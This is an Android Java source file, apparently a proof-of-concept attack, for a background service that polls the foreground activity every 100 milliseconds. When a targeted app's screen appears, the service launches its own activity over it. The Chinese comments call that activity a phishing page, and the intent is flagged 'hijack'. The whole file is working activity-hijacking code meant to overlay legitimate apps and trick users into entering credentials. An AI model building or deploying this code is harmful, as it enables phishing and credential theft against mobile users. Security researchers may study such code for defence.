package com.example.pipmovestack;

import android.app.Service;
import android.app.usage.UsageEvents;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import java.util.Calendar;

public class MonitorService extends Service {

    private static final String TAG = "PIPMoveStack";

    private Handler mHandler = null;
    private static final int POSTDELAYED_COUNTS = 100;

    private static final String[] targetActivityArrays = MonitorList.targetActivityArrays;

    public MonitorService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate(){
        super.onCreate();
        mHandler = new Handler();
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                //分析进程
                String fore = getForegroundClassName(getApplicationContext());
                Log.i(TAG,"Name" + fore);
                for(String targetActivityArray:targetActivityArrays){
                    if(targetActivityArray.equals(fore)){
                        openPhishingActivity();
                    }
                }
                mHandler.postDelayed(this, POSTDELAYED_COUNTS);
            }
        });
    }

    //打开钓鱼页面
    private void openPhishingActivity(){
        Intent Video = new Intent(this, VideoActivity.class);                   //这里直接让Task回到了FS模式
        Video.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);                                       //没有这段不能挤回FS模式
        Video.addFlags(Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
        Video.putExtra("hijack",true);
        startActivity(Video);
    }

    public static String getForegroundClassName(Context context) {
        //Get the app record in the last month
        Calendar calendar = Calendar.getInstance();
        final long end = calendar.getTimeInMillis();
        calendar.add(Calendar.MONTH, -1);
        final long start = calendar.getTimeInMillis();

        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        UsageEvents usageEvents = usageStatsManager.queryEvents(start, end);
        UsageEvents.Event event = new UsageEvents.Event();
        String className = null;
        while (usageEvents.hasNextEvent()) {
            usageEvents.getNextEvent(event);
            if (event.getEventType() == UsageEvents.Event.ACTIVITY_RESUMED) {
                className = event.getClassName();
            }
        }
        return className;
    }
}